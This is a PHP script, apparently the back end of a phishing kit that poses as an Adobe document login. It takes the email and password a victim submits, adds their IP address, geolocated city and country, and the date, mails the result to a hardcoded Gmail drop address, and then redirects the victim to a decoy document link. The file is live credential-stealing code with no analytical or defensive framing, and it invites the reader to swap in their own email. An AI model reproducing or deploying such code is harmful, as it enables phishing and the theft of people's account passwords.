<?php
if($_POST["email"] != "" and $_POST["pass"] != ""){
require_once('geoplugin.class.php');

$geoplugin = new geoPlugin();
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 
$adddate=date("D M d, Y g:i a");
$message .= "|----------------|  E M A I L  |------------------|\n";
$message .= "EMail           : ".$_POST['email']."\n";
$message .= "Pass            : ".$_POST['pass']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "IP Address: ".$ip."\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= "Date: ".$adddate."\n";
$message .= "-----------------BURHAN FUDPAGE [.] COM--------------------\n";
//change ur email here
$send = "ebonyebobo@gmail.com";
$subject = "Result - ".$country;
$headers = "From: Ad0be Protect<customer-support@Spammers>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

 
     header("Location: http://docdro.id/wPKGl2j");
}else{
header("Location: index.php");
}

?>